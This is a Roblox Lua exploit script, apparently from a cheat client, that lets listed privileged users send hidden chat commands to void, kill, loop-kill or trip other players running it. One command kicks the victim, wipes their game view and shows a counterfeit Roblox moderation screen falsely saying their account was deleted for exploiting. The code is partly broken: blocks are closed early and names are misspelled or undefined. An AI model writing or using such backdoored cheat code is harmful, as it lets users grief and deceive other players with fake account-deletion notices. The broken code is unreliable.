local neb = { 
    "AytoIsNotHard",
    "BWDevsStopKickingMe",
  }
  
  local priv = {
  "NebulaWareONTOP1pro",
  "poybeans",
  }
  
  local StarterGui = game:GetService("StarterGui")
  local Notify = function(_Title, _Text , Time)
      StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
  end
  
  
  --THING--
  local textChatService = game:GetService("TextChatService")
  local chat = Instance.new("TextChannel")
  chat.Parent = textChatService.TextChannels
  chat.Name = "sex"
  local done = false
  local StarterGui = game:GetService("StarterGui")
  local Notify = function(_Title, _Text , Time)
      StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
  end
  local cmds = "⭐cmds are: void, cmds, reset, loopkill, unloopkill, trip, byfron⭐"
  local ores = "⭐ores that can be dropped are:"
  local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
  function GetPlayer(String)
      local plr
      for i, v in pairs(game:GetService("Players"):GetPlayers()) do
          if v.Name:lower():sub(1, #String) == String:lower() then
              plr = v
          end 
      end
      if String == "me" then
          plr = game.Players.LocalPlayer
      end
      if String == "" or String == " " then
          plr = nil
      end
      return plr
  end
  
  local NEB = {
    "AytoIsNotHard",
    "BWDevsStopKickingMe"
  }
  local TextChatService = game:GetService("TextChatService")
  local Listening;
  
  
  Listening = TextChatService.MessageReceived:Connect(function(prompt)
      local speaker = tostring(prompt.TextSource)
      local message = prompt.Text
      local args = message:split(" ")
          local data = prompt.Metadata
      local cmd = args[1]
      local who = args[2]
    local mat = args[3]
    local penis = args[4]
      local target = GetPlayer(who)
      local function getsexter(sexdude)
          local x = false
          for i,v in pairs(priv) do
              if typeof(v) == "string" then
                  if v == sexdude then
                      x = true
                      break
                  end
              elseif typeof(v) == "number" then
                  if v == sexdude then
                      x = true
                      break
                  end
              end
          end
          return x
      end
      print(speaker)
      print(message)
      print(cmd)
      print(target)
    print(mat)
    print(penis)
  
                 
  
  if cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer.Name ~= NEB and game.Players.LocalPlayer == target then
  prompt.Text = "⁥"
  prompt.PrefixText = "⁥"
  h = target.Character.HumanoidRootPart
  h.CFrame = h.CFrame - Vector3.new(0,1000,0)
  
  elseif cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
  prompt.Text = "⁥"
  prompt.PrefixText = "⁥"
  h = game.Players.LocalPlayer.Character.HumanoidRootPart
  h.CFrame = h.CFrame - Vector3.new(0,1000,0)
  
  elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer.Name ~= NEB and game.Players.LocalPlayer == target then
  prompt.Text = "⁥"
  prompt.PrefixText = "⁥"
  local textChatService = game:GetService("TextChatService")
  textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(cmds)
  textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("asdasd")
  
  elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
  prompt.Text = "⁥"
  prompt.PrefixText = "⁥"
  local textChatService = game:GetService("TextChatService")
  textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(cmds)
  textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("asdasd")
  
  elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= NEB then
  prompt.Text = "⁥"
  prompt.PrefixText = "⁥"
  target.Character.Humanoid.Health = 0
  
  elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
  prompt.Text = "⁥"
  prompt.PrefixText = "⁥"
  game.Players.LocalPlayer.Character.Humanoid.Health = 0
  
  
  
  elseif cmd == ";loopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= NEB then
  game.Players.LocalPlayer.Character.Humanoid.Health = 0
  getgenv().loopkill = game.Players.LocalPlayer.CharacterAdded:Connect(function()
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.Health = 0
  end)
  
  elseif cmd == ";unloopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= NEB then
  loopkill:Disconnect()
  
  
  
  elseif cmd == ";loopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker   and who == "." and game.Players.LocalPlayer.Name ~= NEB then
  game.Players.LocalPlayer.Character.Humanoid.Health = 0
  getgenv().loopkill = game.Players.LocalPlayer.CharacterAdded:Connect(function()
  wait(0.3)
  game.Players.LocalPlayer.Character.Humanoid.Health = 0
  end)
  
  elseif cmd == ";unloopkill" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker  and who == "." and game.Players.LocalPlayer.Name ~= NEB then
  loopkill:Disconnect()
  end
  end)
  
  elseif cmd == ";trip" and get sexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
  entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
  end
  
  elseif cmd == ";byfron" and sexter(speaker) and game.Players.LocalPLayer.Name ~= speaker and who == "." and game.Players.LocalPlayer.Name ~= NEB then
                  task.spawn(function()
                      local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
                      local Roact = getrenv().require(game:GetService("CorePackages").Roact)
                      UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
                      local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
                      local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
                      local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
                      local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
                      local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
                      lplr.PlayerGui:ClearAllChildren()
                      GuiLibrary.MainGui.Enabled = false
                      game:GetService("CoreGui"):ClearAllChildren()
                      for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
                      task.wait(0.2)
                      lplr:Kick()
                      game:GetService("GuiService"):ClearError()
                      task.wait(2)
                      local gui = Instance.new("ScreenGui")
                      gui.IgnoreGuiInset = true
                      gui.Parent = game:GetService("CoreGui")
                      local frame = Instance.new("Frame")
                      frame.BorderSizePixel = 0
                      frame.Size = UDim2.new(1, 0, 1, 0)
                      frame.BackgroundColor3 = Color3.new(1, 1, 1)
                      frame.Parent = gui
                      task.delay(0.1, function()
                          frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                      end)
                      task.delay(2, function()
                          local e = Roact.createElement(auth, {
                              style = {},
                              screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
                              moderationDetails = {
                                  punishmentTypeDescription = "Delete",
                                  beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
                                  reactivateAccountActivated = true,
                                  badUtterances = {},
                                  messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
                              },
                              termsActivated = function() 
                                  game:Shutdown()
                              end,
                              communityGuidelinesActivated = function() 
                                  game:Shutdown()
                              end,
                              supportFormActivated = function() 
                                  game:Shutdown()
                              end,
                              reactivateAccountActivated = function() 
                                  game:Shutdown()
                              end,
                              logoutCallback = function()
                                  game:Shutdown()
                              end,
                              globalGuiInset = {
                                  top = 0
                              }
                          })
                          local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
                                  localization = tLocalization.mock()
                              }, {Roact.createElement(UIBlox.Style.Provider, {
                                      style = {
                                          Theme = darktheme,
                                          Font = gotham
                                      },
                                  }, {e})}))
                          Roact.mount(screengui, game:GetService("CoreGui"))
                      end)
                  end)
              end
